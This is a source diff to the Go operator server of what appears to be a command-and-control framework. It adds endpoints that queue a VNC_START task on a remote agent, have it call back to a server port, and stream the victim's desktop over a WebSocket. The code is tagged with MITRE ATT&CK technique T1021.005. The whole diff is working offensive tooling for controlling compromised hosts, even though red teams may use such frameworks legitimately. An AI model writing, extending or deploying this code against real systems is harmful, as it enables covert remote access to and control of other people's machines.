@@ -71,6 +71,8 @@ func (s *Server) operatorMux() *http.ServeMux {
 	mux.HandleFunc("/api/encode", s.requireRole(RoleOperator, s.apiEncode))
 	mux.HandleFunc("/api/gencert", s.requireRole(RoleOperator, s.apiGenCert))
 	mux.HandleFunc("/api/rsocks", s.requireRole(RoleOperator, s.apiRSocks))
+	mux.HandleFunc("/api/vnc", s.requireRole(RoleOperator, s.apiVNC))
+	mux.HandleFunc("/api/vnc/", s.requireRole(RoleOperator, s.apiVNCStream))
 	// SSE event stream + uploads
 	mux.HandleFunc("/api/events", s.requireRole(RoleViewer, s.apiSSE))
 	mux.HandleFunc("/api/uploads", s.requireUploadsRole)
@@ -2375,6 +2377,7 @@ func (s *Server) apiAttackLayer(w http.ResponseWriter, r *http.Request) {
 		"SOCKS_START":      "T1090",
 		"SOCKS5_START":     "T1090",
 		"RSOCKS_START":     "T1090.002",
+		"VNC_START":        "T1021.005",
 		"HTTP_PIVOT_START": "T1090",
 		"TCP_PIVOT_START":  "T1090",
 		"PORTFWD_ADD":      "T1572",
@@ -3366,4 +3369,93 @@ func (s *Server) apiBOFInstall(w http.ResponseWriter, bofDir string) {
 	}
 
 	jsonOK(w, map[string]interface{}{"lines": lines, "total": total})
+}
+
+// apiVNC manages interactive VNC desktop sessions.
+//
+//	POST   /api/vnc  {"agent_id":"...", "quality":60}
+//	  → starts VNC session, queues VNC_START on agent
+//	  → returns {"agent_id":"...", "quality":60, "status":"started"}
+//	DELETE /api/vnc  {"agent_id":"..."}
+//	  → stops VNC session, queues VNC_STOP on agent
+func (s *Server) apiVNC(w http.ResponseWriter, r *http.Request) {
+	switch r.Method {
+	case http.MethodPost:
+		var req struct {
+			AgentID string `json:"agent_id"`
+			Quality int    `json:"quality"`
+		}
+		if err := jsonBody(r, &req); err != nil {
+			jsonErr(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		if req.AgentID == "" {
+			jsonErr(w, "agent_id required", http.StatusBadRequest)
+			return
+		}
+		// Support short-prefix matching
+		agents, _ := s.db.ListAgents()
+		for _, a := range agents {
+			if strings.HasPrefix(a.ID, req.AgentID) {
+				req.AgentID = a.ID
+				break
+			}
+		}
+		if req.Quality == 0 {
+			req.Quality = 60
+		}
+		callbackPort, err := s.StartVNC(req.AgentID, req.Quality)
+		if err != nil {
+			jsonErr(w, err.Error(), http.StatusInternalServerError)
+			return
+		}
+		op := operatorFromCert(r)
+		taskArgs := fmt.Sprintf("%d %d", callbackPort, req.Quality)
+		s.db.QueueTask(req.AgentID, "VNC_START", taskArgs, nil, op)
+		s.printf("[%s] vnc start: agent=%s callback=:%d quality=%d\n",
+			op, shortID(req.AgentID), callbackPort, req.Quality)
+		jsonOK(w, map[string]interface{}{
+			"agent_id": req.AgentID,
+			"quality":  req.Quality,
+			"status":   "started",
+		})
+
+	case http.MethodDelete:
+		var req struct {
+			AgentID string `json:"agent_id"`
+		}
+		if err := jsonBody(r, &req); err != nil {
+			jsonErr(w, err.Error(), http.StatusBadRequest)
+			return
+		}
+		if err := s.StopVNC(req.AgentID); err != nil {
+			jsonErr(w, err.Error(), http.StatusNotFound)
+			return
+		}
+		op := operatorFromCert(r)
+		s.db.QueueTask(req.AgentID, "VNC_STOP", "", nil, op)
+		jsonOK(w, map[string]string{"status": "stopped"})
+
+	default:
+		jsonErr(w, "POST or DELETE required", http.StatusMethodNotAllowed)
+	}
+}
+
+// apiVNCStream upgrades the connection to a WebSocket and attaches the client
+// to an existing VNC session. Path: /api/vnc/<agentID>
+func (s *Server) apiVNCStream(w http.ResponseWriter, r *http.Request) {
+	agentID := strings.TrimPrefix(r.URL.Path, "/api/vnc/")
+	if agentID == "" {
+		http.Error(w, "agent_id required", http.StatusBadRequest)
+		return
+	}
+	// Expand short prefix
+	agents, _ := s.db.ListAgents()
+	for _, a := range agents {
+		if strings.HasPrefix(a.ID, agentID) {
+			agentID = a.ID
+			break
+		}
+	}
+	s.ServeVNCWebSocket(w, r, agentID)
 }
